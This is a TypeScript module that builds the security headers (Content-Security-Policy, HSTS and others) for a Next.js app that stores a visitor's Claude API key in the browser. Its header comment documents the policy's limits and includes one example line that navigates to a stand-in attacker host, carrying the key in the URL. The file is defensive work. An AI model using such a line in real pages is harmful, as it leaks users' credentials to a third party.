/**
 * Response headers for every route (applied in next.config.ts).
 *
 * Visitors may keep their own Claude API key in this browser (ADR 008). The
 * real defense for that key is having no script-injection vector at all:
 * React escapes all rendered text, `dangerouslySetInnerHTML` is banned by lint
 * (`react/no-danger`), and the app loads no third-party scripts. This policy
 * is defense in depth, and it has limits worth stating plainly:
 *
 * - `script-src` allows `'unsafe-inline'`. Every page is statically
 *   prerendered (Cache Components / partial prerendering) and Next.js inlines
 *   per-page flight data as `<script>` tags. Nonces need a freshly rendered
 *   page per request, which Next's CSP guide notes is incompatible with
 *   partial prerendering, and hashes can't cover per-page inline data. So the
 *   CSP would not stop an injected inline script from running.
 * - `connect-src`, `img-src`, `form-action` and `frame-src` block the common
 *   ways a script could send data elsewhere (fetch/XHR/WebSocket, image
 *   beacons, form posts, frames), but no CSP can stop top-level navigation
 *   (e.g. `location = "https://evil.example/?k=" + key`).
 */

export const CLAUDE_API_ORIGIN = "https://api.anthropic.com";

/** Two years, the usual HSTS preload minimum. Browsers ignore HSTS over plain http (e.g. localhost). */
export const HSTS_VALUE = "max-age=63072000; includeSubDomains";

export function contentSecurityPolicy({ dev }: { dev: boolean }): string {
  const directives: Record<string, string[]> = {
    "default-src": ["'self'"],
    // React needs eval in development only (debug stacks).
    "script-src": ["'self'", "'unsafe-inline'", ...(dev ? ["'unsafe-eval'"] : [])],
    "style-src": ["'self'", "'unsafe-inline'"],
    "img-src": ["'self'", "data:", "blob:"],
    // next/font self-hosts the fonts.
    "font-src": ["'self'"],
    // 'self' also covers the dev server's same-origin hot-reload WebSocket.
    "connect-src": ["'self'", CLAUDE_API_ORIGIN],
    "manifest-src": ["'self'"],
    "worker-src": ["'self'"],
    "frame-src": ["'none'"],
    "object-src": ["'none'"],
    "base-uri": ["'none'"],
    "form-action": ["'self'"],
    "frame-ancestors": ["'none'"],
    // Over plain http (localhost) browsers treat loopback as secure and don't rewrite it.
    "upgrade-insecure-requests": [],
  };
  return Object.entries(directives)
    .map(([name, values]) => [name, ...values].join(" "))
    .join("; ");
}

export function securityHeaders({ dev }: { dev: boolean }): { key: string; value: string }[] {
  return [
    { key: "Content-Security-Policy", value: contentSecurityPolicy({ dev }) },
    { key: "Strict-Transport-Security", value: HSTS_VALUE },
    { key: "Referrer-Policy", value: "no-referrer" },
    {
      key: "Permissions-Policy",
      value: "camera=(), microphone=(), geolocation=(), payment=(), usb=(), serial=(), hid=(), browsing-topics=()",
    },
    { key: "X-Content-Type-Options", value: "nosniff" },
    { key: "X-Frame-Options", value: "DENY" },
    { key: "Cross-Origin-Opener-Policy", value: "same-origin" },
  ];
}
